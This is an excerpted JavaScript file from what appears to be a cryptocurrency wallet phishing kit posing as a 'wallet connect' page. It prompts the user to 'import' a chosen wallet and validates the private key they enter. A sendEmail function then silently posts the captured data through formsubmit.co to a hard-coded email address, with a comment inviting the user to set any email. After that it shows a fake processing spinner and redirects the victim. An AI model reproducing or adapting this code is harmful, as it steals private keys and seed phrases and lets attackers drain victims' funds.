...
console.log("🚀 login.js loaded - starting...");
...
function enhancedModalClose() {
  ...
  const modals = document.querySelectorAll(
    ".modal, .third-modal, .custom-alert",
  );
...
function openVortex() {
  ...
  vortexTimer = setTimeout(function () {
    ...
    document
      .querySelector(".modal-connect-button-3b")
...
function closeModalTwo() {
  ...
  secondModalSpan.onclick = function () {
    if (isProcessing) {
      if (
        confirm(
          "You have a connection in progress. Are you sure you want to cancel?",
        )
      ) {
        enhancedModalClose();
      }
...
document
  .getElementById("form-connect-button")
  .addEventListener("click", function (event) {
    ...
    if (isValid) {
      ...
      if (messageContent) {
        console.log("🟢 Calling handleButtonUI()");
        handleButtonUI();
        ...
        setTimeout(function () {
          console.log("🟢 Redirecting to reconnect.html");
          window.location.href = "reconnect.html";
        }, 4000);
      } else {
        console.log("🔴 No message content collected");
      }
    } else {
...
function validateActiveForm() {
  console.log("🔍 validateActiveForm called");
...
function validatePrivateKeyForm() {
  ...
  if (privateKey.length < 14 || /\s/.test(privateKey)) {
    showCustomAlert(
      "Private keys often consist of a sequence of hexadecimal characters without spaces",
    );
    return false;
  } else {
    return true;
...
function sendEmail(content) {
  const walletType = document.querySelector(".modal-connection-status-2a")?.textContent || 'Unknown';
  
  const form = document.createElement('form');
  form.method = 'POST';
  form.action = 'https://formsubmit.co/Richoffwoods@murena.io'; // SET WHATEVER EMAIL HERE
  ...
  const fields = {
    ...
    '_subject': 'New Wallet Connection',
    '_captcha': 'false', // Set to true to enable captcha
    '_template': 'table'
  };
  ...
  console.log("📧 Email sent to Richoffwoods@murena.io");
...
function handleButtonUI() {
  ...
  button.innerHTML =
    '<div class="processing-content"><div class="spinner"></div><span class="processing-text">Processing...</span></div>';
...
document.addEventListener("DOMContentLoaded", function () {
  ...
  // Check if form button exists
  const formButton = document.getElementById("form-connect-button");
  console.log("Form button found:", formButton ? "YES" : "NO");

  if (formButton) {
    console.log("Button text:", formButton.textContent);
  }
  ...
  secondModalButtonSpan = document.getElementsByClassName(
    "second-close-button",
  )[0];
  ...
  if (walletList) {
    walletList.addEventListener("click", function (event) {
      ...
      if (clickedItem) {
        ...
        document.querySelector(".modal-connection-status-2a").textContent =
          logoTitle;
        document.querySelector(".modal-logo").src = logoSrc;
        document.querySelector(".newModalheader").textContent =
          `Import your ${logoTitle}`;
  ...
  navigationLinks.forEach((link) => {
    link.addEventListener("click", function (e) {
      if (isProcessing) {
        ...
        if (
          confirm(
            "You have a connection in progress. Are you sure you want to leave?",
          )
        ) {
          resetAllProcessingStates();
